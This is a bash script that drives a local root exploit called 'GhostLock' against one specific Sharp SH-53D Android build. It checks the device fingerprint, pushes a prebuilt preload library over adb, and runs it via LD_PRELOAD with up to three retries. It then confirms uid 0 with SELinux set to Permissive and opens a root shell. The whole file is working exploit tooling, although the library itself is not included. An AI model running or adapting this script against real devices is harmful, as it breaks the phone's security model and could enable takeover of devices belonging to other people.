#!/usr/bin/env bash
set -euo pipefail

readonly EXPECTED_FINGERPRINT='DOCOMO/SH-53D/SH-53D:15/AP3A.240905.015.A2/38JP_3_330:user/release-keys'
readonly ARTIFACT='out/preload-sh53d-38JP_3_330.so'
readonly REMOTE_SO='/data/local/tmp/sh53d-ghostlock.so'
readonly REMOTE_LOG='/data/local/tmp/.ghostlock-38JP_3_330.log'
readonly REMOTE_SU='/data/local/tmp/su'

command -v adb >/dev/null || { echo 'adb was not found.' >&2; exit 1; }
[[ -f "$ARTIFACT" ]] || { echo 'Build first with ./build.sh.' >&2; exit 1; }

device_count=$(adb devices | awk 'NR > 1 && $2 == "device" { n++ } END { print n + 0 }')
[[ "$device_count" == 1 ]] || {
  echo "Exactly one authorized adb device is required (found $device_count)." >&2
  exit 1
}

fingerprint=$(adb shell getprop ro.build.fingerprint | tr -d '\r')
[[ "$fingerprint" == "$EXPECTED_FINGERPRINT" ]] || {
  echo "Unsupported build: $fingerprint" >&2
  echo "Expected: $EXPECTED_FINGERPRINT" >&2
  exit 1
}

echo '[1/4] Waiting for Android.'
adb wait-for-device
until [[ "$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" == 1 ]]; do
  sleep 2
done

if adb shell "$REMOTE_SU -c id" 2>/dev/null | grep -F 'uid=0(root)' >/dev/null &&
   [[ "$(adb shell getenforce | tr -d '\r')" == Permissive ]]; then
  echo '[2/4] Temporary root is already active for this boot.'
else
  echo '[2/4] Installing the build-specific preload library.'
  adb push "$ARTIFACT" "$REMOTE_SO" >/dev/null
  adb shell chmod 0644 "$REMOTE_SO"

  exploit_ok=0
  for outer_attempt in 1 2 3; do
    adb shell rm -f "$REMOTE_LOG" 2>/dev/null || true
    echo "[3/4] Running GhostLock (run $outer_attempt/3)."
    if adb shell env "GHOSTLOCK_LOG=$REMOTE_LOG" +         "LD_PRELOAD=$REMOTE_SO" /system/bin/true; then
      :
    fi

    if adb get-state >/dev/null 2>&1 &&
       adb shell cat "$REMOTE_LOG" 2>/dev/null | tr -d '\r' |
         grep -F 'ghostlock preload verdict: EXPLOIT OK' >/dev/null; then
      exploit_ok=1
      break
    fi

    echo "GhostLock run $outer_attempt did not complete; waiting for the device." >&2
    adb wait-for-device
    until [[ "$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" == 1 ]]; do
      sleep 2
    done
    adb push "$ARTIFACT" "$REMOTE_SO" >/dev/null
    adb shell chmod 0644 "$REMOTE_SO"
  done

  [[ "$exploit_ok" == 1 ]] || {
    echo "Three runs did not produce a verified root daemon. See $REMOTE_LOG" >&2
    exit 1
  }
fi

echo '[4/4] Verifying a new root client and SELinux state.'
verification=$(adb shell "$REMOTE_SU" -c 'id; getenforce')
printf '%s\n' "$verification"
grep -F 'uid=0(root)' <<<"$verification" >/dev/null
grep -F 'Permissive' <<<"$verification" >/dev/null

if [[ -t 0 && -t 1 ]]; then
  echo 'Opening the temporary root shell.'
  exec adb shell -t "$REMOTE_SU"
fi

echo "Temporary root is ready: adb shell -t $REMOTE_SU"
